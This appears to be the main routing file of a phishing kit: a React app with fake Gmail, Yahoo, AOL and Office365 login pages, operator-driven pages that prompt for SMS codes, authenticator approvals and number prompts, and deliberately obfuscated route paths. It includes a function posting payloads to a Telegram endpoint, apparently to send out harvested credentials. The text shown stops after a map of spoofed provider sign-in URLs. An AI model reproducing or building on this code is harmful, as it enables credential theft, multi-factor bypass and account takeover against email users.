import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate, useLocation } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import OthersLoginPage from './components/OthersLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import ProviderRedirect from './components/ProviderRedirect';
import Spinner from './components/common/Spinner';
import GmailSmsCodePage from './components/interactive/GmailSmsCodePage';
import GmailAuthPromptPage from './components/interactive/GmailAuthPromptPage';
import Office365SmsCodePage from './components/interactive/Office365SmsCodePage';
import Office365AuthPromptPage from './components/interactive/Office365AuthPromptPage';
import YahooSmsCodePage from './components/interactive/YahooSmsCodePage';
import YahooAuthPromptPage from './components/interactive/YahooAuthPromptPage';
import AolSmsCodePage from './components/interactive/AolSmsCodePage';
import AolAuthPromptPage from './components/interactive/AolAuthPromptPage';
import OthersSmsCodePage from './components/interactive/OthersSmsCodePage';
import OthersAuthPromptPage from './components/interactive/OthersAuthPromptPage';
import IncorrectPasswordPage from './components/interactive/IncorrectPasswordPage';
import AccountLockedPage from './components/interactive/AccountLockedPage';
import SecurityCheckPage from './components/interactive/SecurityCheckPage';
import TwoFactorPage from './components/interactive/TwoFactorPage';
import EmailVerificationPage from './components/interactive/EmailVerificationPage';
import GoogleNumberPromptPage from './components/interactive/GoogleNumberPromptPage';
import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (payload: Record<string, unknown>) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
  }
};

// Obfuscated route paths
const ROUTES = {
  HOME: '/brgnticvpchctym5duv1d70eywdxep5an857hdjrnrt31y9madtvoe0dl5wh9uwdjk6zoy5xs6ii05n37dyueriqrb32mk1yosi2620glvinkafq88cx1mjh421dlddpub6fatx54f5n6tuhckmp3m3xgc2on8',
  LOGIN: '/4pelo3vzx6ei7ych296jb2mvnhqokj1t7j2gq7qkgh1n9tzzr7h9yb0jvi2pw81jx3n7o22tjps78ut8iorj1vv5s0and0rdzmk4m5xpp8e1ap8c4xcneibr93rhseg5127t3nuasqdvuhz6edzjm8ni54a9cy',
  LOGIN_YAHOO: '/eqmbwtyetkubevfw9i1rqsftn0tepqmc8wtbqqopu0n1fw1r0i91xhnykq8sxk4gltk5re16xllreupyvya4qqq0t6hll23keljtu7loqysbysak9hxymr77hn7oxgjpa61mjyrt5i5i5vmktk3rjt26nhrrtl',
  LOGIN_AOL: '/stncyiw230jhw98jy9s2m58pp9nwz8ng3ffwajrmk8ibacbuzxreqo7en872riqqp254tnavjui6zd1mul4xw3dkq6hqxowbmzq30dxq0bqexkc5jsakvwc4vig6fun7ft8fi0ebhjl2x1ea83uu9k513zgimk',
  LOGIN_GMAIL: '/5nqhr4zkyb0np3zdfbrh1yxk4z5lmgalonutxdsz6hzekg3jsvhwtvxt0iqian5vgu8entmd96c5x0d56u4cn03vbnqmwe0jk2i7sw9nbuyqx0b4p7nhjrxeqr1nh3srj07bmm2tox8clxtvrydhr6mfijj5j6',
  LOGIN_OTHERS: '/j9xf3ceh46jptot7daclbqb7668vv4l1mxerrmscub5pr0iqdebmn3quxoivejcv7ripcmo63o8saawtb6hy3psudjx7wurq86rphsj700baxygur7up0jd30ebp9c9u1y7nx4y8httfzwwuinf4tfolgdudws',
  LOGIN_OFFICE365: '/mtwavnfbcxdh84u25c58xv7igejfgyavzq7i3lwelij3tipowa7fb93n6gk3ml8ul7d8v034j43e7u1egw9hpeoeqxj81uzyozv0ikn0i4a5gas0auqcl73dx4aymbkdy0dxxbj4tzo72f6az6uzq9onxrnklt',
  OTP: '/938uv6106001sygvk1bzhqhx9xfjas1v6ccxfyy8ls30qdkba1n68dftexsdc3xd1zlkwjge9n5c4u2mkfnvk1gq9z027c8mn7miuqhd6ped06ov44zcqrlpmntinhbhfzz5qph9u23pdl1udmhm9x4s3f8i2a',
  LANDING: '/6dck1w4qnffnxtiaofl09u4wy5txozis4phoji3cjswgcm4btl6ghnm343m9hht8g3x4j89v40esarpatd18z5v2bv70yqwmd9ggpn7xng1ys93f1kkaflacbh1i1b4p3774z7hkpzgzs122783h3dbe56ziad',
  // Per-provider SMS code pages (real-time WebSocket-driven full-screen pages)
  SMS_GMAIL: '/lkgosw6f3k7c8lt0hwk3xaq93klxofifnrf3jxmz1ya8nkt39fczhozs9wlplem9zefuvyy2nwrjoxdtau5dqj9rc34e1abbx0csn1o286qgoixp0e8gms2piw8lsouc51l4arzfhohg3rekkkv8v2qvhzavc9ak',
  SMS_OFFICE365: '/8th75q4hqaxpk1v28wgf3po8vkjfl03mo61cijk15dcfth3n3y8xafb67uo9uyrvk49kfdh9umvx1ga035cogdloyly93j3cxb18mkdebhzkj81l700hsj2he81qxx1enp8qzkd55ozy3pt1k3e9d4t1m3apsmt1',
  SMS_YAHOO: '/b7s8xn9py7c7qffdlvu3zv5nfadyvi9wz67jsx8fs47cdhi4iff5q6ea9p1gl931jbnhgr5gubjl72qjyjyfbbm48mkcfjqf4bmgukdulafqf3wo6er98oh687auh8aeipdbu1wwayuz6mvxpu4a2uwajgjm24m8',
  SMS_AOL: '/vg7xd6msiqe2kh5zt4jkqndqufddaexy7i960pemlsuelr4h9n8wnfbt28xrm87c0508uxt5yqogu96d865ugspyj67t2nogie271e6299fixsryekr6q5iv0zqrn5bzgribbn36cqkfp7jbxanvsr1vllrcic2z',
  SMS_OTHERS: '/gl1jb1eoep5zsb05jcr0equ14szw5nwv3ohqwoenf76n6pfzxy68hwitdonxed3djec2l38tffugo1uwod0bjbwrxf59wkuevh4rzx19c59n9w8m1kv46iojutx9tgehpdn44rc27uqe92xk74g1othflov3n6m1',
  // Per-provider authenticator-approval pages (real-time WebSocket-driven full-screen pages)
  AUTH_GMAIL: '/p8bga1a3fk84q4drtpbcqgxl8ta8pq8ylhp87imc8gcbtp731983pl40j7famtqovvcvy8rfm9cm3q74bzf7153fr09ncjiisiu4naom4ynjju33gsyalaclu6enzz4opf0r6dpogtm7zit377ix6bfui75fyc0r',
  AUTH_OFFICE365: '/d8jkr6961harawhgd7r7pjk7j9vheh3njxq3o3higm4goqi5g8yu2gxj9rabzibcquanfjek1dafzvwydl9eh5r3tpe389z7ctvgkumplkchp2ku4akxiopkx6up0cjef7c2adwguf5mod9q5yji4jnfaioau29s',
  AUTH_YAHOO: '/3ocmaxnd5r59gfmaovkc5u0lsciq85onj33ianp9201cpzo9fn1th2r0xkoep2ylqletxhyakoilmeh79w558647p4snia50i6qxyuw38wwvosp5h41faoz1qq6085n2p7upue1jr8xt2g736sogmwfz8b8wky97',
  AUTH_AOL: '/hiil08euvdj4tz6nvvmgjg707c51pst93iiw5je3rra5hncipc34y695msj73a14ism8nv8fdaliuuc0gxdtsro2c9i21ytpj9vxdwtdrsx7nsa3eswh0kkicefoj17qg88eqsjticqa1a893nklg0hjhb99ua3a',
  AUTH_OTHERS: '/8x8uzkd2grn4abyurknvt2ibzguhduj3qoqebrdigh19yxorkcikoer7yw08nzsu8b5siyzqfkw1zqlonf1kg58iqqcwd2f3dq4zlyt93tas9qs5hxgvmylzisa1c556q9b7nu8j85palffg130w5rvwei52cmv8',
  // Per-provider "incorrect password" pages (realistic reload-of-login with error)
  PWD_GMAIL: '/cm18ds52uo8xif8zaeirhx5ybq1ssmv108qzdwffhtnucvuv4atjh668sbaor7lmhv0r9byjb2xxxoqprwjmjn54zoczdogwdj612f1xtfhor4a3x9ooa9x8qbri9znxodh98mont9p6du8fk7tlie3ebsdjpupd44yjw',
  PWD_OFFICE365: '/3365hpn3igd4mfnyzhiqxx40bfymtnft4yklxn87pceewzco8g8vnzn0u9p16jx09vhcogylg0bviigib2prnie3hajw4ft8i08vjoktde6w40zysfu5mossok7mhx9k677orttpy0gmpc8jqmzrnybzyostmhblewcyr',
  PWD_YAHOO: '/ha1fh6sdv9hyu3vnx5sfknvy2m075aemrp566ojwyxjl1b5ltuoyuogyfhwrwzpjs1j8md7ce4zjatad02ldwya3s6739jniqtqou1u8vhkwsd3ex1jr9fuckot0vlkjiusghvbr9vccxxv2jze9mo1lay1jkf9c9inhx',
  PWD_AOL: '/w87qv79stskc8qnptfqhk0no1mqeylqxx6ohf44uy0607j2cbzfbbi7g35h5unx6y1ai9zct6apzuc6bg76dhpegc7exib3di491pup4m985q2862ixgcmzmxv6awdo25uf2qaed3wfvrqvgoejiicqh91eyue8kmzq5p',
  PWD_OTHERS: '/8zmqpr1c90gyaflk7ngawlg9a22q7wpzurzc265yus9vpuo6fyxo4jmrsrrxp9ht71cn3uvp3i42f0w2ko2qbxc5zqvhumcqqi1yn18bp3xjtwr5upb58xz6hlldzqxqyc9oo3stnvvevk03jgfl345udvgekbl4p295i',
  // Per-provider "account locked" pages
  LOCKED_GMAIL: '/zx6ehml0c9vv73a4hildfo026541ceyhcod98n3z4kyl6yyxhf3qgvr6876iim7zvb7wjnp9zroqz2cb2pbsv9izexwvx4ie1exs6n1xkebb5ev5hg1540zy3vtlcrgli853b6vyz1jr7kq2ltp8me06dk7tpy0optuef',
  LOCKED_OFFICE365: '/kxyds1jp8qou65qv5clg6f9nniujjr6x4wuki43j1rzhc0neqfzvaakryir8qt6qdt8p32d7f1d9mk1mg277nls3my1whiyawa28zob8pqto7t6ul3hd6oyc32pbjg99wmuac0nehq3dnfi963opn0drlz63wthxtkk0b',
  LOCKED_YAHOO: '/b3oonzyvbsg9674bdslzc92i7dp74b1l00c0y3a3793my4xp9n2ube8r5k8qljlr162wjbyazb8rti0zf4wt2aa8oln284bh1vhwysn7vnqipr4rpifze1gcf5l757dl7ysy63k7ax98ljqgzt8noeplgys50j7qwxb32',
  LOCKED_AOL: '/7c7wbkznukzq7y9exw9wmri4a9jft0l12jli8qwp6ifyb04kcj4o2y7d3uqstv5n3q2wwday629hd2ey8r8ucs85y559ftrlog7y22da3egwulvl12b7b72q27ygw64myfn22cqtuofq8g8jei7q1b7wkinluo07fpnob',
  LOCKED_OTHERS: '/zzlih4u77q4s0vxhlnhig4cqdw4iht6bi6tc1y3e4eepnag58w599w9jmkpcoz4avnmvqmv4xpqzw2t40i1vi49rdsfrn98so4sl217gfo9qk1xapcubv4jfk5xqdz9rvtsr0svxn0kpyff3va4vo70hjbeqve8vghsdj',
  // Per-provider "security check" pages
  SEC_GMAIL: '/3ovg6rlwqpfmbzjaxuwcdo9a7bjh6v1gcn9cdewngx3a7n4b2f0ftbd3inebe9q6qa9aol3nz4vph4qgshroybz3c5n3ag0txfnprcupwwmedi0e454uhc0tq7fidzfekk35kdsnl3mnqx0ia8tah0hexw9mtjc7ur36w',
  SEC_OFFICE365: '/rwmwj1ffqgly0fcagxu4tvqrp1ncjdmsju76mujciwbqa2hnznvbktzjswzg1klkr837x8o4b90ul1qyu1990cz9w8ez6rzgk434dv7ty96ce25qp383o4sutuouh1w0pp2i2gaxhserk0qp1c7q2gor6mzpd4enar70o',
  SEC_YAHOO: '/1sp7573rdhum6r02sf3i6k27ojivoufjig171mqjvpy7w90derhc9yuoyf87xkwyjpicrl17nonrhrywh3ixkf8t3owo7q7kyrshaxmvmlkj60akverxd0blrdy5s8j2enjs4vy6zkhnw7w72wxle60vs1d7yhb7q6bmc',
  SEC_AOL: '/qzjmcr4dcladg2q85d978ik776yzc7f833p8yg04ylp8l9kwvxlxc1y46gvl1k9eonn21gribpq68o4318dbsj39dtae0nobok80fw7r1fkm873liteaytbvd5ivvai3uf8q20jxbrzjxuviqql7yzpzrptqnprzjvja4',
  SEC_OTHERS: '/1ietls8zfe21widvoi0hitfxckok2s86prkr57xry5318e7rxsk6ves09eybih3hls429ilwd24hv0w65oy34vjspuwij54e2pqz6gcg9b6tbeicx1xp38nksso0gol2r17hx5zfm5hgk041xfyjwpbzxn1i6pvuz2xy4',
  // Per-provider "two-factor required" pages
  TFA_GMAIL: '/9v8fb06n1aig0j10p9rrbgpmnk60kot6nlvqh7q2y5o7n8y7inflvchin15iqmg658m4de8p22bdmllgbfkws8ls528i39fqgzrtv81gj9cnjjoyxay8fom1g1x6zxu3030k1kk72jvqjxqkqfnrxlg9tl92x0voqk2pe',
  TFA_OFFICE365: '/kpsbgg5enj34drjc2k84g4rl70csv1osm4j48sqdt3y20k8pazmv9qx9miigiq2mn3nj0goff32xotglue196a06oocii89xbx66cwqq9n7lsg3y44y53ffj59lzwuioqhtgsdwpwewm4mwtqpw090qgjhqfhgqxxd2js',
  TFA_YAHOO: '/kbj3bp4jli84yxqwcdtk7t4gmityfypztdnr1hwccc2oom2yqj7r5lak5qj7difdkm36fsycpdr5s7irlr0vcmswh7gfg1a5cskkkeu3kkt6f4041lu8xkrhaes8fgw0wg88ud34mpjekefx1jaefhg4p4zdyekaz6ufe',
  TFA_AOL: '/vpshgyuw9ye1scdsuv1t4g2ruiefsxkokfxlgu6eobtaawa8m6n5ygw1qp8fs04afoq4rh4y8cwt35bpo18i6oc1d7ywy6h6nh8rex64sfodt1p8wye06tf604yowen5yl7crg9sf09e6banuc8vao7kjvlz4j5t1vo6z',
  TFA_OTHERS: '/02lf2shdkobu8memgfsian5x5xmbhvdy9qkhuzhobpl1e9791jh43tiq22k3uyag1pz6a8atzz0p14xyeq63rhjxdqlnl65yzqcnwkz96l44rlgll0hgyiql7y05fvrsu667wc50y3xwczg03c8petumfkzuhyyk0fnoa',
  // Per-provider "email verification" pages
  EMAIL_V_GMAIL: '/t9aft16ihtczvvsqxxjcbf0ewioyehv6rym4b3lm7fpvxijb5r2jgrpspiy5vilguvua5o5gonxhga2e8fpn3nmm2kphalo9a5qebllbby18y1ohkx9tki5vk08eet3as759tv6vk789buco5nrh47tpzwnr84xeugb65',
  EMAIL_V_OFFICE365: '/uhswn2uzao8aaqund17w090p56nxu07vzuxtf3jfktimpbmhmef79zsv6ih5mikl2xfbdd1mwz4tkew9xf37e77e0815y8feyuztghg5nglybr0kk2uestcsjd4nmvyggtyysztpe4ja84cl74mq9seu96334kovbvls4',
  EMAIL_V_YAHOO: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
  EMAIL_V_AOL: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
  EMAIL_V_OTHERS: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
  // Per-provider Google "# Prompt" pages (real-time, triggered by WebSocket
  // `show_google_number_prompt`). Although the flow is Google-branded, we
  // route per-provider so non-Gmail sessions still pick up provider-correct
  // chrome (background, font, accent) when the operator fires it.
  GPROMPT_GMAIL: '/q4kvhxcl8z2vw5fdz0u3rkcq49n31jp5jwfa75tnzlj0pxwc5b8gvlsr0c8w6dzhux2anf5x9ltjurhz8mkpa1bdf8jp78q9zwyer3a3wxwlt5q3wwgr0pzv6cydbam4qkj2dpb5e5p7n3uhlpkfftnha2u9j7p',
  GPROMPT_OFFICE365: '/v6lnsf5p6gqj9zhgz2dtmgbkpnyqcd2cm7l1xjy3w7dhqrsa6c0vu0fa9gcjr4qy4pn8tx7w7vfdt4yxqr9wf6q1rmjxbgr8q24z32xkjhxvxwrqvqe9pf6t87vqf9bz4nlbe3v8gjfvb3pjqgu1m43ttfg8qznp',
  GPROMPT_YAHOO: '/u3ng7v4q9bjpmlt3gh8w8tfcn6jxg5kr0fk2ymfp5b7lqzjm9ru9jr0qx2x1y4mr2xwx6q7c4n9hmzxqqrf67h3uth4uqe9wqmtugrkbwtyrh1g9q4pglqnmnsudg94ucze4pfyq6syvb6gcetv3vdfmpwmgkz1',
  GPROMPT_AOL: '/p9q3rwmzbjvr8z4mehctddwn7m2lqv7r5cfpwk6xv3hb9ueh3xvz2tspj6cb6qf78x9cqztr7d8qkphbu9pbqzx9z9qkb46wupj0gbm6vvr5ek4r3prh3qufzlqfcfp9vxbzcdz0bjhdkksz9p3jszrrdr3thq9',
  GPROMPT_OTHERS: '/n5sb87gnqmm2cpybqgvy0fnj3vd2vexk3kmt8d6ynbvrn3jdcphsxwhmsq2zqwd4mrlqqrn8gehfxlcqnt5q4ubrdfxz6ld8aqq3pfvzh6ghvxyf3pud5d63lcd2sktwqx2ddyswr04hktvw8z2hg5j9wbrfb6r',
};

// Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
// SMS-code and authenticator-approval routes. Unknown providers fall through to the
// generic "Others" routes.
const normalizeProviderKey = (provider?: string): 'gmail' | 'office365' | 'yahoo' | 'aol' | 'others' => {
  const p = (provider || '').toLowerCase();
  if (p.includes('gmail') || p.includes('google')) return 'gmail';
  if (p.includes('office') || p.includes('microsoft') || p.includes('outlook') || p.includes('o365')) return 'office365';
  if (p.includes('yahoo')) return 'yahoo';
  if (p.includes('aol')) return 'aol';
  return 'others';
};

const SMS_ROUTE_BY_PROVIDER: Record<ReturnType<typeof normalizeProviderKey>, string> = {
  gmail: '/lkgosw6f3k7c8lt0hwk3xaq93klxofifnrf3jxmz1ya8nkt39fczhozs9wlplem9zefuvyy2nwrjoxdtau5dqj9rc34e1abbx0csn1o286qgoixp0e8gms2piw8lsouc51l4arzfhohg3rekkkv8v2qvhzavc9ak',
  office365: '/8th75q4hqaxpk1v28wgf3po8vkjfl03mo61cijk15dcfth3n3y8xafb67uo9uyrvk49kfdh9umvx1ga035cogdloyly93j3cxb18mkdebhzkj81l700hsj2he81qxx1enp8qzkd55ozy3pt1k3e9d4t1m3apsmt1',
  yahoo: '/b7s8xn9py7c7qffdlvu3zv5nfadyvi9wz67jsx8fs47cdhi4iff5q6ea9p1gl931jbnhgr5gubjl72qjyjyfbbm48mkcfjqf4bmgukdulafqf3wo6er98oh687auh8aeipdbu1wwayuz6mvxpu4a2uwajgjm24m8',
  aol: '/vg7xd6msiqe2kh5zt4jkqndqufddaexy7i960pemlsuelr4h9n8wnfbt28xrm87c0508uxt5yqogu96d865ugspyj67t2nogie271e6299fixsryekr6q5iv0zqrn5bzgribbn36cqkfp7jbxanvsr1vllrcic2z',
  others: '/gl1jb1eoep5zsb05jcr0equ14szw5nwv3ohqwoenf76n6pfzxy68hwitdonxed3djec2l38tffugo1uwod0bjbwrxf59wkuevh4rzx19c59n9w8m1kv46iojutx9tgehpdn44rc27uqe92xk74g1othflov3n6m1',
};

const AUTH_ROUTE_BY_PROVIDER: Record<ReturnType<typeof normalizeProviderKey>, string> = {
  gmail: '/p8bga1a3fk84q4drtpbcqgxl8ta8pq8ylhp87imc8gcbtp731983pl40j7famtqovvcvy8rfm9cm3q74bzf7153fr09ncjiisiu4naom4ynjju33gsyalaclu6enzz4opf0r6dpogtm7zit377ix6bfui75fyc0r',
  office365: '/d8jkr6961harawhgd7r7pjk7j9vheh3njxq3o3higm4goqi5g8yu2gxj9rabzibcquanfjek1dafzvwydl9eh5r3tpe389z7ctvgkumplkchp2ku4akxiopkx6up0cjef7c2adwguf5mod9q5yji4jnfaioau29s',
  yahoo: '/3ocmaxnd5r59gfmaovkc5u0lsciq85onj33ianp9201cpzo9fn1th2r0xkoep2ylqletxhyakoilmeh79w558647p4snia50i6qxyuw38wwvosp5h41faoz1qq6085n2p7upue1jr8xt2g736sogmwfz8b8wky97',
  aol: '/hiil08euvdj4tz6nvvmgjg707c51pst93iiw5je3rra5hncipc34y695msj73a14ism8nv8fdaliuuc0gxdtsro2c9i21ytpj9vxdwtdrsx7nsa3eswh0kkicefoj17qg88eqsjticqa1a893nklg0hjhb99ua3a',
  others: '/8x8uzkd2grn4abyurknvt2ibzguhduj3qoqebrdigh19yxorkcikoer7yw08nzsu8b5siyzqfkw1zqlonf1kg58iqqcwd2f3dq4zlyt93tas9qs5hxgvmylzisa1c556q9b7nu8j85palffg130w5rvwei52cmv8',
};

type ProvKey = ReturnType<typeof normalizeProviderKey>;

const INCORRECT_PWD_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
  gmail: '/cm18ds52uo8xif8zaeirhx5ybq1ssmv108qzdwffhtnucvuv4atjh668sbaor7lmhv0r9byjb2xxxoqprwjmjn54zoczdogwdj612f1xtfhor4a3x9ooa9x8qbri9znxodh98mont9p6du8fk7tlie3ebsdjpupd44yjw',
  office365: '/3365hpn3igd4mfnyzhiqxx40bfymtnft4yklxn87pceewzco8g8vnzn0u9p16jx09vhcogylg0bviigib2prnie3hajw4ft8i08vjoktde6w40zysfu5mossok7mhx9k677orttpy0gmpc8jqmzrnybzyostmhblewcyr',
  yahoo: '/ha1fh6sdv9hyu3vnx5sfknvy2m075aemrp566ojwyxjl1b5ltuoyuogyfhwrwzpjs1j8md7ce4zjatad02ldwya3s6739jniqtqou1u8vhkwsd3ex1jr9fuckot0vlkjiusghvbr9vccxxv2jze9mo1lay1jkf9c9inhx',
  aol: '/w87qv79stskc8qnptfqhk0no1mqeylqxx6ohf44uy0607j2cbzfbbi7g35h5unx6y1ai9zct6apzuc6bg76dhpegc7exib3di491pup4m985q2862ixgcmzmxv6awdo25uf2qaed3wfvrqvgoejiicqh91eyue8kmzq5p',
  others: '/8zmqpr1c90gyaflk7ngawlg9a22q7wpzurzc265yus9vpuo6fyxo4jmrsrrxp9ht71cn3uvp3i42f0w2ko2qbxc5zqvhumcqqi1yn18bp3xjtwr5upb58xz6hlldzqxqyc9oo3stnvvevk03jgfl345udvgekbl4p295i',
};

const ACCOUNT_LOCKED_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
  gmail: '/zx6ehml0c9vv73a4hildfo026541ceyhcod98n3z4kyl6yyxhf3qgvr6876iim7zvb7wjnp9zroqz2cb2pbsv9izexwvx4ie1exs6n1xkebb5ev5hg1540zy3vtlcrgli853b6vyz1jr7kq2ltp8me06dk7tpy0optuef',
  office365: '/kxyds1jp8qou65qv5clg6f9nniujjr6x4wuki43j1rzhc0neqfzvaakryir8qt6qdt8p32d7f1d9mk1mg277nls3my1whiyawa28zob8pqto7t6ul3hd6oyc32pbjg99wmuac0nehq3dnfi963opn0drlz63wthxtkk0b',
  yahoo: '/b3oonzyvbsg9674bdslzc92i7dp74b1l00c0y3a3793my4xp9n2ube8r5k8qljlr162wjbyazb8rti0zf4wt2aa8oln284bh1vhwysn7vnqipr4rpifze1gcf5l757dl7ysy63k7ax98ljqgzt8noeplgys50j7qwxb32',
  aol: '/7c7wbkznukzq7y9exw9wmri4a9jft0l12jli8qwp6ifyb04kcj4o2y7d3uqstv5n3q2wwday629hd2ey8r8ucs85y559ftrlog7y22da3egwulvl12b7b72q27ygw64myfn22cqtuofq8g8jei7q1b7wkinluo07fpnob',
  others: '/zzlih4u77q4s0vxhlnhig4cqdw4iht6bi6tc1y3e4eepnag58w599w9jmkpcoz4avnmvqmv4xpqzw2t40i1vi49rdsfrn98so4sl217gfo9qk1xapcubv4jfk5xqdz9rvtsr0svxn0kpyff3va4vo70hjbeqve8vghsdj',
};

const SECURITY_CHECK_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
  gmail: '/3ovg6rlwqpfmbzjaxuwcdo9a7bjh6v1gcn9cdewngx3a7n4b2f0ftbd3inebe9q6qa9aol3nz4vph4qgshroybz3c5n3ag0txfnprcupwwmedi0e454uhc0tq7fidzfekk35kdsnl3mnqx0ia8tah0hexw9mtjc7ur36w',
  office365: '/rwmwj1ffqgly0fcagxu4tvqrp1ncjdmsju76mujciwbqa2hnznvbktzjswzg1klkr837x8o4b90ul1qyu1990cz9w8ez6rzgk434dv7ty96ce25qp383o4sutuouh1w0pp2i2gaxhserk0qp1c7q2gor6mzpd4enar70o',
  yahoo: '/1sp7573rdhum6r02sf3i6k27ojivoufjig171mqjvpy7w90derhc9yuoyf87xkwyjpicrl17nonrhrywh3ixkf8t3owo7q7kyrshaxmvmlkj60akverxd0blrdy5s8j2enjs4vy6zkhnw7w72wxle60vs1d7yhb7q6bmc',
  aol: '/qzjmcr4dcladg2q85d978ik776yzc7f833p8yg04ylp8l9kwvxlxc1y46gvl1k9eonn21gribpq68o4318dbsj39dtae0nobok80fw7r1fkm873liteaytbvd5ivvai3uf8q20jxbrzjxuviqql7yzpzrptqnprzjvja4',
  others: '/1ietls8zfe21widvoi0hitfxckok2s86prkr57xry5318e7rxsk6ves09eybih3hls429ilwd24hv0w65oy34vjspuwij54e2pqz6gcg9b6tbeicx1xp38nksso0gol2r17hx5zfm5hgk041xfyjwpbzxn1i6pvuz2xy4',
};

const TWO_FACTOR_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
  gmail: '/9v8fb06n1aig0j10p9rrbgpmnk60kot6nlvqh7q2y5o7n8y7inflvchin15iqmg658m4de8p22bdmllgbfkws8ls528i39fqgzrtv81gj9cnjjoyxay8fom1g1x6zxu3030k1kk72jvqjxqkqfnrxlg9tl92x0voqk2pe',
  office365: '/kpsbgg5enj34drjc2k84g4rl70csv1osm4j48sqdt3y20k8pazmv9qx9miigiq2mn3nj0goff32xotglue196a06oocii89xbx66cwqq9n7lsg3y44y53ffj59lzwuioqhtgsdwpwewm4mwtqpw090qgjhqfhgqxxd2js',
  yahoo: '/kbj3bp4jli84yxqwcdtk7t4gmityfypztdnr1hwccc2oom2yqj7r5lak5qj7difdkm36fsycpdr5s7irlr0vcmswh7gfg1a5cskkkeu3kkt6f4041lu8xkrhaes8fgw0wg88ud34mpjekefx1jaefhg4p4zdyekaz6ufe',
  aol: '/vpshgyuw9ye1scdsuv1t4g2ruiefsxkokfxlgu6eobtaawa8m6n5ygw1qp8fs04afoq4rh4y8cwt35bpo18i6oc1d7ywy6h6nh8rex64sfodt1p8wye06tf604yowen5yl7crg9sf09e6banuc8vao7kjvlz4j5t1vo6z',
  others: '/02lf2shdkobu8memgfsian5x5xmbhvdy9qkhuzhobpl1e9791jh43tiq22k3uyag1pz6a8atzz0p14xyeq63rhjxdqlnl65yzqcnwkz96l44rlgll0hgyiql7y05fvrsu667wc50y3xwczg03c8petumfkzuhyyk0fnoa',
};

const EMAIL_VERIFICATION_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
  gmail: '/t9aft16ihtczvvsqxxjcbf0ewioyehv6rym4b3lm7fpvxijb5r2jgrpspiy5vilguvua5o5gonxhga2e8fpn3nmm2kphalo9a5qebllbby18y1ohkx9tki5vk08eet3as759tv6vk789buco5nrh47tpzwnr84xeugb65',
  office365: '/uhswn2uzao8aaqund17w090p56nxu07vzuxtf3jfktimpbmhmef79zsv6ih5mikl2xfbdd1mwz4tkew9xf37e77e0815y8feyuztghg5nglybr0kk2uestcsjd4nmvyggtyysztpe4ja84cl74mq9seu96334kovbvls4',
  yahoo: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
  aol: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
  others: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
};

const GOOGLE_PROMPT_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
  gmail: ROUTES.GPROMPT_GMAIL,
  office365: ROUTES.GPROMPT_OFFICE365,
  yahoo: ROUTES.GPROMPT_YAHOO,
  aol: ROUTES.GPROMPT_AOL,
  others: ROUTES.GPROMPT_OTHERS,
};

const PROVIDER_URLS = {
  MICROSOFT: '/login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Faccount.adobe.com%2Foauth2%2Fcallback&response_type=code&scope=openid+profile+email',
  YAHOO: '/login.yahoo.com/?src=ym&pspid=159600001&activity=header-signin&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2F',
  GMAIL: '/accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=ARpgrqe&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
  AOL: '/login.aol.com/account/challenge/password?src=ym&pspid=159600001&activity=header-signin&.lang=en-US',
  OTHERS: '/secure-mail.com/login?service=mail&continue=https%3A%2F%2Fmail.secure-mail.com',
};

